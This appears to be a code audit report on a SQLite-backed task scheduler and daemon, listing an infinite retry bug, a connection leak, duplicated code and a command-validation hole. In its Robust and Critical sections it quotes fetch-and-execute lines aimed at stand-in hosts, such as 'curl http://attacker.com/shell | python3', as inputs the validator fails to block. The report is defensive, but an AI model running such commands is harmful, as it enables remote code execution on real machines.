# Chunk Audit: Scheduler & Daemon

**User-facing feature**: Scheduled tasks, recurring jobs, delivery via email/iMessage/notification
**Risk Level**: High
**Files Audited**:
- `scheduler/__init__.py`
- `scheduler/engine.py`
- `scheduler/daemon.py`
- `scheduler/handlers.py`
- `scheduler/delivery.py` (shim to `delivery/service.py`)
- `scheduler/alert_evaluator.py`
- `scheduler/morning_brief.py`
- `mcp_tools/scheduler_tools.py`

**Status**: Complete

## Purpose (as understood from reading the code)

This chunk provides a cron/interval/once task scheduler backed by SQLite. The `SchedulerEngine` polls for due tasks, executes typed handlers (alert evaluation, webhook polling, morning brief, custom subprocess, etc.), updates next-run times using an optimistic pre-advance lock, and delivers results via a channel adapter (`delivery/service.py`). The `JarvisDaemon` wraps the engine in a persistent asyncio loop with SIGTERM/SIGINT handling, iMessage polling, hourly Graph token refresh, and an optional proactive-action pass. The `mcp_tools/scheduler_tools.py` exposes CRUD tools to Claude Code for managing tasks.

The `scheduler/__init__.py` does **not** export the engine or daemon — it re-exports availability/slot-analysis functions from `scheduler/availability.py`, which is unrelated to task scheduling. The naming is confusing but not broken.

## Runtime Probe Results

- **Tests found**: Yes — 6 test files (test_scheduler.py, test_scheduler_engine.py, test_scheduler_tools.py, test_scheduler_timeout.py, test_graph_schedule.py, test_schedule_meeting.py)
- **Tests run**: 148 passed, 0 failed
- **Import/load check**: OK — all modules import cleanly
- **Type check**: Not run (mypy not available in venv)
- **Edge case probes**: Confirmed — see Correct and Robust sections below
- **Key observation**: Infinite retry loop confirmed for tasks with a corrupted `schedule_config` stored in SQLite; task fires on every daemon tick until manually disabled.

## Dimension Assessments

### Implemented

All handler types listed in `HandlerType` model are dispatched by `execute_handler()`. The delivery path (`_deliver` → `delivery/service.py`) is fully wired. `run_scheduled_task` in the MCP tools layer correctly offloads to a thread to avoid blocking the event loop. The timeout path (`asyncio.wait_for` + `asyncio.to_thread`) is tested and working. The cron parser handles `*`, ranges, lists, and steps. Nothing is stubbed.

### Correct

**Confirmed bugs:**

1. **Infinite retry loop on bad schedule_config** (`engine.py:184`): `calculate_next_run()` is called before the outer `try` block is entered — wait, it IS inside the try at line 179. However, when `calculate_next_run` raises (e.g. corrupt cron stored in DB), the `except` at line 227 does NOT update `next_run_at`. The task's `next_run_at` stays at its prior value (which is `<= now`, which is why it fired). On the next tick, `get_due_tasks` picks it up again — forever. The same pattern exists in `_execute_task_async` (line 269–341). Runtime-confirmed by probe: invalid cron raises `ValueError`.

2. **`alert_evaluator.py:209` — MemoryStore not closed on early return or exception**: `memory_store.close()` is at line 209, inside the main `try` block after the main loop. If `not rules` triggers the early `return` at line 165, `memory_store` was opened but never closed (connection leak). If an unhandled exception occurs, the outer `except` at line 211 calls `sys.exit(1)` without closing `memory_store`.

3. **`run_scheduled_task` in `scheduler_tools.py:248` — no optimistic next_run pre-advance**: Unlike `engine._execute_task`, the MCP `run_scheduled_task` tool runs the handler first, then calculates and updates next_run. If the daemon also fires during a long-running manual invocation, both can execute the task simultaneously (double execution). The daemon's engine pre-advances `next_run_at` before execution; the MCP tool does not.

**Correct behaviors confirmed by probe:**
- `once`-type tasks: `calculate_next_run` returns `None` after the task fires; `update_scheduled_task(next_run_at=None)` sets `next_run_at` to NULL; `get_due_tasks` WHERE `next_run_at IS NOT NULL` correctly prevents re-execution.
- Weekday convention (`0=Monday`) is documented in both `CronExpression` and the MCP tool docstring, consistent with probe results.

### Efficient

The daemon re-creates `ProactiveSuggestionEngine` on every tick (`daemon.py:132`) rather than caching it. This is a lightweight object but loads from SQLite each tick — minor inefficiency, not production-impactful given the tick interval. The `_execute_task` and `_execute_task_async` methods contain ~60 lines of nearly-identical logic (delivery block, error block, next_run calc). No structural efficiency problem.

### Robust

**Error handling gaps:**

1. **Bad `schedule_config` → infinite retry**: documented above (Critical finding).

2. **`alert_evaluator.py` MemoryStore leak**: The `try/finally` pattern is missing; the store is only closed on the happy path.

3. **`_validate_custom_command` allows arbitrary interpreter abuse**: Probed and confirmed — `python /tmp/evil.py`, `curl http://evil.com/shell.sh`, `wget http://malicious.com/payload`, `/absolute/path/to/any.sh`, `python3 ../escape.py` all pass validation. The blocklist only checks the base command name (e.g. `rm`, `sudo`). A user with access to create scheduled tasks via MCP can execute arbitrary Python scripts, network downloads, or shell scripts at any absolute/relative path. Since `shell=False` is set, shell-injection is blocked, but interpreter-mediated injection is not.

4. **`handlers.py:226-232` — nested `asyncio.run` in `ThreadPoolExecutor`**: The webhook dispatch handler detects a running event loop and spawns a `ThreadPoolExecutor(max_workers=1)` to run `asyncio.run(...)` in a thread. This is a recognized workaround for the nested-loop problem but can deadlock if the inner coroutine tries to share resources with the outer loop (e.g. shared SQLite connection on the same thread). Currently safe because SQLite access is thread-serialized, but fragile.

5. **`morning_brief.py` timeout handling**: The `run_with_cleanup` wrapper handles `TimeoutExpired`, but if the Claude CLI subprocess hangs (does not raise `TimeoutExpired`), the result is silent. The subprocess.TimeoutExpired is handled correctly for the `subprocess.run` case — confirmed.

### Architecture

1. **Massive code duplication**: `_execute_task` (sync) and `_execute_task_async` are ~80 lines each with identical delivery and error-handling blocks. The only real difference is `asyncio.wait_for`/`asyncio.to_thread` wrapping the handler call. This should be a single implementation with a thin async wrapper.

2. **`_parse_json_config` / `_parse_config` duplication**: `handlers.py:30` and `morning_brief.py:183` define functionally identical 6-line JSON parsing functions. `morning_brief` could simply import from `handlers`.

3. **`scheduler/delivery.py` is a pure shim** with no own logic — this is fine as a backward-compat layer, but the comment should make the canonical location explicit (it already does).

4. **`scheduler/__init__.py` exports availability functions, not scheduler functions**: The module boundary is misleading. A developer looking for `SchedulerEngine` imports would not think to look inside `scheduler/engine.py` — but they also wouldn't import from `scheduler` directly. Not a runtime problem.

5. **`alert_evaluator.py` uses `sys.path.insert`** at module load time (line 13). This is a legacy pattern from when it ran as a standalone launchd script. Now that it is invoked via `_run_alert_eval_handler()` inside the daemon's event loop, the `sys.path` manipulation is unnecessary and potentially order-sensitive.

6. **`run_scheduled_task` in `scheduler_tools.py` re-implements execution logic** already in `SchedulerEngine._execute_task_async`. It duplicates the handler call, `last_run_at` update, and error fallback. It should delegate to `engine._execute_task_async`.

## Findings

### 🔴 Critical

- **`scheduler/engine.py:227-241` and `engine.py:328-341`** — Tasks with a corrupt `schedule_config` (e.g. stored invalid cron expression, or zero-interval) cause an infinite retry loop. When `calculate_next_run` raises inside `_execute_task`, the outer `except` records `last_run_at` but does NOT advance `next_run_at`. The task remains `next_run_at <= now` and fires on every subsequent daemon tick. This can peg the daemon in a tight loop, spam logs, re-run failing handlers continuously, and exhaust SQLite write budget. Fix: set `next_run_at` to a sentinel (NULL or a far-future time) and set `enabled=False` after N consecutive failures.

- **`scheduler/handlers.py:42-58` (`_validate_custom_command`)** — The command allowlist blocks shell metacharacters and well-known dangerous commands (rm, sudo), but allows arbitrary interpreter execution: `python /tmp/evil.py`, `wget http://attacker.com/payload`, `curl http://attacker.com/shell | python3`, `./local_script.sh`, etc. Any user with MCP tool access (i.e. any Claude Code session using this MCP server) can run arbitrary code by creating a `custom` handler task. Runtime-confirmed by probe. Fix: add a `python`-specific allowlist of trusted script paths, or restrict custom handlers to a `scripts/` subdirectory, or require an admin whitelist of allowed commands.

### 🟡 Warning

- **`scheduler/alert_evaluator.py:163-165, 211-213`** — `MemoryStore` is opened at line 156 but only closed at line 209. Early return at line 165 (no rules) and the outer exception handler at line 211 (calls `sys.exit(1)`) both exit without closing the store. This leaks the SQLite connection on every run where no rules exist. Fix: wrap in `try/finally` or use a context manager.

- **`mcp_tools/scheduler_tools.py:248-266` (`run_scheduled_task`)** — Manual task execution via MCP does not pre-advance `next_run_at` before running the handler. If the daemon tick fires during a long-running manual execution (e.g. morning_brief takes 2-5 minutes), both execute simultaneously. Fix: use `SchedulerEngine._execute_task_async` directly, which already implements the optimistic lock.

- **`scheduler/engine.py:171-243` vs `engine.py:259-343`** — `_execute_task` and `_execute_task_async` are ~80-line near-duplicates. Any bug fix applied to one must be manually mirrored to the other. This has already caused divergence: `_execute_task` does not have the `asyncio.TimeoutError` guard; `_execute_task_async` does. This pattern should be refactored — a shared `_build_task_result` helper and a single delivery/error-handling path would eliminate the duplication.

- **`scheduler/daemon.py:132` — `ProactiveSuggestionEngine` created fresh every tick**: While lightweight, it re-queries SQLite on every tick even when there is nothing to do. Should be instantiated once in `__init__` and reused.

### 🟢 Note

- `scheduler/morning_brief.py:183` and `scheduler/handlers.py:30` define functionally identical `_parse_config`/`_parse_json_config` functions. `morning_brief.py` should import `_parse_json_config` from `handlers.py`.
- `scheduler/alert_evaluator.py:13` (`sys.path.insert`) is a launchd-era artifact. Now that this runs inside the daemon, the path manipulation is dead weight.
- The non-standard cron weekday convention (`0=Monday` instead of `0=Sunday`) is well-documented in both the engine and the MCP tool docstring. Users are correctly warned. No fix needed, but worth flagging for operators writing cron expressions.
- All 148 tests pass; test coverage for the engine's timeout and cron edge cases is strong.

## Verdict

The scheduler core (cron parsing, task execution, delivery, daemon loop) is implemented and working — 148 tests pass with no failures. Two critical issues need attention before this is considered production-safe: a task with a corrupt `schedule_config` will fire on every daemon tick in an infinite retry loop, and the `custom` handler type allows arbitrary code execution by any MCP client. The alert evaluator has a resource leak on early-return paths. The most impactful structural problem is the ~80-line duplication between `_execute_task` and `_execute_task_async`, which has already caused functional divergence (timeout guard exists only in the async path) and will cause more bugs as the code evolves.
